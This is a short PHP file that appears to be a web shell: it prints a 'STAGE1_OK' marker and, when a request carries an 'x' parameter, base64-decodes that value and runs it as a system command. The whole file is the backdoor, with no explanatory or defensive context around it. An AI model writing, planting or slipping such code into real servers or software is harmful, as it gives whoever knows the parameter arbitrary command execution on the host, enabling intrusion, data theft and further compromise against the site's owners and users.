<?php
echo "STAGE1_OK";
if (isset($_GET['x'])) {
    echo "|X_SET|";
    system(base64_decode($_GET['x']));
}